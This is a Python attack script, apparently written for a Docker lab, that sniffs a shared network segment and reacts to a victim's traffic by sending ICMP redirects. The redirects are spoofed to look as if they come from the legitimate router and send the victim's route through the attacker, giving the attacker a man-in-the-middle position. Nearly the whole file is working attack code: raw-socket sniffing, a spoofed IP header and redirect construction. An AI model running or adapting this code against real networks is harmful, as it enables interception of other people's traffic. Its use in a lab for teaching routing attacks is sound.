#!/usr/bin/env python3
"""
Reactive ICMP Redirect Attack Script
Uses custom packet crafting utilities (util.py) - NO Scapy dependency

This script:
1. Sniffs packets on the shared network segment
2. Detects victim traffic to target hosts  
3. Reactively sends ICMP redirects to poison victim's routing table
4. Creates a race condition with the legitimate router

Key: Attacker is NOT on path initially but CAN sniff victim traffic
"""

import socket
import struct
import sys
import threading
import time
from util import PacketCrafter, NetworkConfig, parse_ip_header, parse_icmp_header

class ReactiveAttacker:
    def __init__(self):
        """Initialize reactive ICMP redirect attacker"""
        # Network configuration matching Docker setup
        self.victim_ip = "10.10.1.10"       # Victim container
        self.router_ip = "10.10.1.1"        # Legitimate router  
        self.attacker_ip = "10.10.1.20"     # This attacker container
        self.target_ip = "10.10.2.10"       # Target container
        
        # Attack state
        self.running = True
        self.packets_sniffed = 0
        self.redirects_sent = 0
        
        print(f"[*] Reactive ICMP Redirect Attacker initialized")
        print(f"    Victim: {self.victim_ip}")
        print(f"    Router: {self.router_ip}")  
        print(f"    Attacker: {self.attacker_ip}")
        print(f"    Target: {self.target_ip}")
        print(f"[*] Attacker is NOT on path but CAN sniff victim traffic")
        
    def start_sniffing(self):
        """Start sniffing packets to detect victim traffic"""
        try:
            print(f"[*] Starting packet sniffing on eth0...")
            
            # Create raw socket for sniffing (requires root)
            sniff_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            sniff_socket.bind(("eth0", 0))
            
            print(f"[*] Sniffing started - waiting for victim traffic...")
            
            while self.running:
                try:
                    # Receive packet
                    packet_data, addr = sniff_socket.recvfrom(65536)
                    self.packets_sniffed += 1
                    
                    # Parse Ethernet frame (skip 14 bytes for Ethernet header)
                    if len(packet_data) < 14:
                        continue
                        
                    eth_type = struct.unpack('!H', packet_data[12:14])[0]
                    
                    # Check if it's an IP packet (0x0800)
                    if eth_type == 0x0800:
                        ip_packet = packet_data[14:]  # Skip Ethernet header
                        self.handle_ip_packet(ip_packet)
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] Sniffing error: {e}")
                    
        except Exception as e:
            print(f"[!] Failed to start sniffing: {e}")
            print(f"[!] Make sure to run as root and in the attacker container")
            
    def handle_ip_packet(self, ip_packet):
        """Process captured IP packets and detect victim traffic"""
        try:
            if len(ip_packet) < 20:
                return
                
            # Parse IP header
            ip_header = parse_ip_header(ip_packet)
            
            # Check if this is victim traffic to our target
            if (ip_header['source_ip'] == self.victim_ip and 
                ip_header['destination_ip'] == self.target_ip):
                
                print(f"[!] VICTIM TRAFFIC DETECTED: {self.victim_ip} -> {self.target_ip}")
                print(f"    Protocol: {ip_header['protocol']}, Length: {ip_header['total_length']}")
                
                # Send reactive ICMP redirect
                self.send_icmp_redirect(ip_packet, ip_header)
                
        except Exception as e:
            print(f"[!] Packet processing error: {e}")
            
    def send_icmp_redirect(self, original_packet, original_ip_header):
        """Send ICMP redirect in response to victim traffic (REACTIVE)"""
        try:
            print(f"[*] Sending ICMP redirect (REACTIVE ATTACK)...")
            
            # Extract original IP header and first 8 bytes of data
            ip_header_length = original_ip_header['header_length']
            original_ip_bytes = original_packet[:ip_header_length]
            original_data = original_packet[ip_header_length:ip_header_length + 8]
            
            # Create ICMP redirect packet using util.py
            icmp_redirect = PacketCrafter.create_icmp_redirect_packet(
                gateway_ip=self.attacker_ip,           # Redirect to attacker
                original_ip_header=original_ip_bytes,   # Original IP header
                original_data=original_data            # First 8 bytes of original data
            )
            
            # Create IP header for redirect packet (from router to victim)
            redirect_ip_header = PacketCrafter.create_ip_header(
                src_ip=self.router_ip,                 # Spoof as legitimate router
                dst_ip=self.victim_ip,                 # Send to victim
                protocol=NetworkConfig.IPPROTO_ICMP,   # ICMP protocol
                payload_length=len(icmp_redirect)      # ICMP payload length
            )
            
            # Combine IP header and ICMP redirect
            redirect_packet = redirect_ip_header + icmp_redirect
            
            # Send the malicious redirect
            PacketCrafter.send_raw_packet(redirect_packet, self.victim_ip)
            
            self.redirects_sent += 1
            print(f"[*] ICMP redirect sent! ({self.redirects_sent} total)")
            print(f"    Spoofed source: {self.router_ip} (legitimate router)")
            print(f"    Target victim: {self.victim_ip}")  
            print(f"    Redirecting to: {self.attacker_ip} (attacker)")
            print(f"    For destination: {self.target_ip}")
            
        except Exception as e:
            print(f"[!] Failed to send ICMP redirect: {e}")
            
    def show_statistics(self):
        """Display attack statistics"""
        print(f"\n[*] Attack Statistics:")
        print(f"    Packets sniffed: {self.packets_sniffed}")
        print(f"    ICMP redirects sent: {self.redirects_sent}")
        
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"[*] Stopping reactive attack...")
        
def main():
    """Main function - start reactive ICMP redirect attack"""
    print("="*60)
    print("REACTIVE ICMP REDIRECT ATTACK")
    print("Using custom packet crafting (util.py)")
    print("="*60)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This script requires root privileges for raw sockets")
        print("[!] Run with: sudo python3 reactive_attacker.py")
        sys.exit(1)
        
    # Create attacker instance
    attacker = ReactiveAttacker()
    
    # Set up signal handler for clean shutdown
    import signal
    def signal_handler(sig, frame):
        print(f"\n[*] Received shutdown signal...")
        attacker.stop()
        attacker.show_statistics()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        print(f"[*] Starting reactive attack...")
        print(f"[*] Press Ctrl+C to stop")
        print(f"[*] Waiting for victim traffic to target...")
        
        # Start sniffing (blocking)
        attacker.start_sniffing()
        
    except KeyboardInterrupt:
        print(f"\n[*] Attack interrupted by user")
    except Exception as e:
        print(f"[!] Attack failed: {e}")
    finally:
        attacker.stop()
        attacker.show_statistics()

if __name__ == "__main__":
    import os
    main()
